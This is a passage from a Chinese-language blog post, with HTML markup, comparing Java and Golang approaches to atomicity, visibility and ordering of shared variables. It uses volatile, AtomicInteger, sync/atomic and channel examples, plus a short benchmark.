上的 thread 就會一直使用舊的值。<br>\n下面是一段 java 範例：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">boolean</span> bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>即使 thread 2 已經將 flag 更新為 false，但 thread 1 仍有一定機率會一直卡在 for loop 無法逃脫，因為 thread 1 沒看到 thread 2 對 flag 的更新。</p>\n<h3 id=\"%E6%9C%89%E5%BA%8F%E6%80%A7\"><a class=\"direct-link\" href=\"#%E6%9C%89%E5%BA%8F%E6%80%A7\">#</a> 有序性</h3>\n<p>編譯器在把程式碼轉成 cpu 指令的時候有時會因為效能因素重排指令，這會導致實際 cpu 執行指令的順序和你想像的不太一樣。例如下面三行 code：</p>\n<pre class=\"language-text\"><code class=\"language-text\">a = 1  <br>b = 2  <br>c = a + b</code></pre>\n<p>第三行相依前兩行 code，因此 compile 只會保證前兩行在第三行前執行，亦即m是實際上執行順序可能會是</p>\n<pre class=\"language-text\"><code class=\"language-text\">b = 2  <br>a = 1  <br>c = a + b</code></pre>\n<p>這在 signle thread 是沒問題的，但在 multi thread 情況下亂序可能會造成你無法理解的 bug。以下是一個簡單的 Java code 範例：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>是很有可能進入進入 12~16 行的 if condition 的，因為對 thread t1 而言 a=2 和 b=1 兩件事沒有 happen-before 關係，所以不會保證順序。</p>\n<p>上面提到的三個 concurrency 問題，其中可見性 (visibility) 和有序性(ordering) 通常一起通稱為 <a href=\"https://en.wikipedia.org/wiki/Happened-before\">happen-before</a> 原則。</p>\n<p>在實作 singleton 模式時常使用 “Double-checked locking” 來優化效能，此時若沒有意識到 happen-before 便會遇到問題：即使 singleton 物件非為 null 也不保證該物件處於初始化完成的狀態，因此有可能會讓系統異常，可參考 wiki 對此異常的<a href=\"https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%E9%94%81%E5%AE%9A%E6%A8%A1%E5%BC%8F\">描述文章</a>。</p>\n<p>接下來看看 Java 和 Golang 怎麼處理這些問題。</p>\n<h2 id=\"java\"><a class=\"direct-link\" href=\"#java\">#</a> Java</h2>\n<h3 id=\"java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\"><a class=\"direct-link\" href=\"#java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\">#</a> Java 如何處理原子性？</h3>\n<p>Java 在 java.util.concurrent.atomic 裡面提供了原子性操作相關的 tool kit，用來保證變數的操作。例如可以用 <strong>AtomicInteger</strong> 來處理對共享變數的操作，如此即可保證原子性不被破壞，得到正確的結果，修改過如下</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">incrementAndGet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">AtomicInteger</span> i <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AtomicInteger</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\"><a class=\"direct-link\" href=\"#java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\">#</a> Java 如何實作 happen-before？</h3>\n<p>Java 提供了 volatile 關鍵字用來處理 happen before，一但變數在宣告時加上 volatile，對該變數的存取即保證可見性和有序性（注意，原子性不在保證內）。以下便是將開頭講的兩個可見性和有序性的例子，使用 volatile 關鍵字宣告共有變數，便可以保證 happen-before。</p>\n<p>以開頭第二個可見性的例子來說：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">boolean</span>  bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>當 flag 使參數使用 volatile 修飾後，thread t1 會馬上感知到 thread t2 在第 12 行對 flag 的異動，到 main memory 讀取最新的值，然後逃離迴圈。</p>\n<p>而以有序性的例子來看 volatile：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>加入 a, b 兩個變數加入 volatile 修飾後，即可確保 a 之前的 code 一定會在 a 之前執行，b 之前的 code 一定會在 b 之前執行，因此 thread t1 的 CPU 指令會保證執行順序一定是 a=2, b=1。而對 main thread 而言，就永遠不會看到 b=1, a=0 這種亂序行為了。</p>\n<h2 id=\"golang\"><a class=\"direct-link\" href=\"#golang\">#</a> Golang</h2>\n<h3 id=\"golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\"><a class=\"direct-link\" href=\"#golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\">#</a> Golang 如何處理原子性？</h3>\n<p>Golang 也有提供自己的 atomic tool kit，還記得最開頭使用 Lock 的 Golang 範例嗎? 可以改成用 atomic 來處理如下：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkFib10</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token function\">int64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tatomic<span class=\"token punctuation\">.</span><span class=\"token function\">AddInt64</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>可以用 atomic 替換掉 Lock，同時達到原子性效果。</p>\n<p>附上兩種寫法的 benchmark:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">BenchmarkLock-8 <span class=\"token number\">9266</span> <span class=\"token number\">134075</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op  <br>BenchmarkAtomic-8 <span class=\"token number\">19225</span> <span class=\"token number\">62309</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op</code></pre>\n<p>相較之下可以看到 Lock 的確很吃效能。下圖附上對 atomic 範例的 profiling</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/atomic-profiling.png\" alt=\"\"></p>\n<p>可以看到 cpu 並沒有花太多時間在處理同步上。</p>\n<h3 id=\"golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\"><a class=\"direct-link\" href=\"#golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\">#</a> Golang 如何實作 happen-before？</h3>\n<p>根據 Golang <a href=\"https://golang.org/ref/mem\">官方 blog</a> 說明了下面幾種情況 Golang 保證 happen before：</p>\n<ul>\n<li>Initialization</li>\n<li>Goroutine creation</li>\n<li>Goroutine destruction</li>\n<li>Channel communication</li>\n<li>Locks</li>\n<li>Once</li>\n</ul>\n<p>但美中不足的是 Golang 並沒有像 Java 的 volatile 可以保證某個變數的 happen before。</p>\n<p>已可見性來說，下面這段 code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">continue</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Never end\\n\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tflag <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>第 5~10 行的 goroutine 會卡在無窮迴圈。</p>\n<p>再說有序性，<a href=\"https://golang.org/ref/mem\">官網 blog</a> 即有提到下面這段 code 不是安全的 concurrncy code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>\tb <span class=\"token operator\">=</span> <span class=\"token number\">2</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這段 code 是有可能先 print 2 再 print 0，因此跨 goroutine 的共有變數使用時，若遇到類似上述的 code，務必要用 lock 等有保證 happen before 的機制保護。</p>\n<p>為了確保有序性和可見性，若真需要共享變數還是必須在變數前後用笨重的 Lock 保護。但高效的 Golang 怎麼會用這麼低效的解法？</p>\n<p>在這篇<a href=\"https://blog.golang.org/codelab-share\">官網的 blog</a> 中我們或許可以找到更適合 Golang 的解法。文章中提到</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.</p>\n</blockquote>\n<p>這也是 Golang 設計 concurrency model 的初衷，使用 <a href=\"https://zh.wikipedia.org/wiki/%E4%BA%A4%E8%AB%87%E5%BE%AA%E5%BA%8F%E7%A8%8B%E5%BC%8F\">CSP model</a>。因此我認為用 channel 來處理可見性和有序性的問題或許是比較 Golang 的做法（如果你還有印象的話，Golang 在 channel 的溝通是有保證 happen-before 的）。</p>\n<p>如可見性範例可以用 chan 在不同的 goroutine 間傳遞 flag 的值：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> flag <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">break</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"End of goroutine\\n\"</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tdone <span class=\"token operator\">&lt;-</span> <span class=\"token boolean\">false</span><br>\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>而有序性範例也可以用 chan 來傳遞 a, b 的值，因此寫起來可能會像下面這段 code</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done <span class=\"token 